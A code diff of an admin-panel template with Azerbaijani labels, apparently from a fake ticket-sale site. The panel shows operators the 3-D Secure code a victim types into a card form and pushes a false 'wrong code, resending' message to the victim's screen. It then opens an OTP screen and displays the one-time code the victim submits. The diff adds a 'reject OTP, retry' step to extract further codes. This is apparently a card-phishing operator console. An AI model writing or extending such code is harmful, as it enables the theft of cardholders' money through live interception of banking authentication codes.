@@ -78,26 +78,34 @@
               <% var st = p.stage || 'card_review'; %>
               <% if (st === 'card_review' && p.status === 'pending_admin') { %>
                 <div class="alert alert--info mt-16">
-                  1-ci addım — istifadəçinin kart forması ilə yazdığı 3-D kod:
+                  <strong>1-ci addım:</strong> İstifadəçinin kart forması ilə yazdığı 3-D kod:
                   <strong class="mono" style="font-size:1.3rem;letter-spacing:.2em"><%= p.firstCode || '—' %></strong>
+                  <br><small>İstifadəçinin ekranında "Səhv 3-D kod daxil etmisiniz" göstərilər, kod təkrar göndəriləcəkdir.</small>
                 </div>
                 <div class="flex-end mt-16">
-                  <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>">1-ci təsdiq (səhv kod bildirişi)</button>
+                  <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>">1-ci Təsdiq Et (Səhv Kod)</button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else if (st === 'wrong_code') { %>
                 <div class="alert alert--warning mt-16">
-                  İstifadəçinin ekranında «Səhv 3-D kod daxil etmisiniz — kod təkrar göndərilir» göstərilir və geri sayım gedir.
+                  <strong>2-ci addım gözlənilir:</strong> İstifadəçinin ekranında «Səhv 3-D kod daxil etmisiniz — kod təkrar göndərilir» göstərilir.
+                  <br><small>Geri sayım başlayıb, yeni 3-D OTP kodu göndərmə vaxtıdır.</small>
                 </div>
                 <div class="flex-end mt-16">
-                  <button class="btn btn--primary btn--sm" data-open-otp="<%= p._id %>">2-ci təsdiq — OTP ekranını aç</button>
+                  <button class="btn btn--primary btn--sm" data-open-otp="<%= p._id %>">2-ci Təsdiq Et (OTP Ekranını Aç)</button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else if (st === 'otp_entry') { %>
-                <p class="sec-note mt-16">OTP ekranı açıqdır — istifadəçinin kodu gözlənilir…</p>
+                <p class="sec-note mt-16"><strong>3-cü addım gözlənilir:</strong> OTP ekranı istifadəçiyə açılıb — kod daxil edilməsi gözlənilir…</p>
               <% } else if (st === 'otp_review') { %>
+                <div class="alert alert--success mt-16">
+                  <strong>3-cü addım tamamlandı:</strong> İstifadəçi OTP kodunu daxil etdi:
+                  <strong class="mono" style="font-size:1.3rem;letter-spacing:.2em"><%= p.submittedCode %></strong>
+                  <% if (p.codeSubmittedAt) { %><br><small><%= new Date(p.codeSubmittedAt).toLocaleString('az-AZ', { timeZone: 'Asia/Baku' }) %></small><% } %>
+                </div>
                 <div class="flex-end mt-16">
-                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>">Yekun təsdiq — bilet ver</button>
+                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>">4-cü Təsdiq Et (Bilet Ver)</button>
+                  <button class="btn btn--warning btn--sm" data-reject-otp="<%= p._id %>">OTP Səhvdir (Yenidən Cəhd)</button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else { %>
@@ -130,7 +138,7 @@
     return res.json();
   }
   document.addEventListener('click', async function (e) {
-    var el = e.target.closest('[data-approve-card],[data-open-otp],[data-approve-final],[data-decline]');
+    var el = e.target.closest('[data-approve-card],[data-open-otp],[data-approve-final],[data-reject-otp],[data-decline]');
     if (!el) { return; }
     e.preventDefault();
     el.disabled = true;
@@ -138,6 +146,7 @@
     if (el.hasAttribute('data-approve-card')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-card') + '/approve-card'; }
     if (el.hasAttribute('data-open-otp')) { url = '/api/admin/payments/' + el.getAttribute('data-open-otp') + '/open-otp'; }
     if (el.hasAttribute('data-approve-final')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-final') + '/approve-final'; }
+    if (el.hasAttribute('data-reject-otp')) { url = '/api/admin/payments/' + el.getAttribute('data-reject-otp') + '/reject-otp'; }
     if (el.hasAttribute('data-decline')) { url = '/api/admin/payments/' + el.getAttribute('data-decline') + '/decline'; }
     try {
       var data = await call(url, { reason: window.T('admin.rejectReason') });
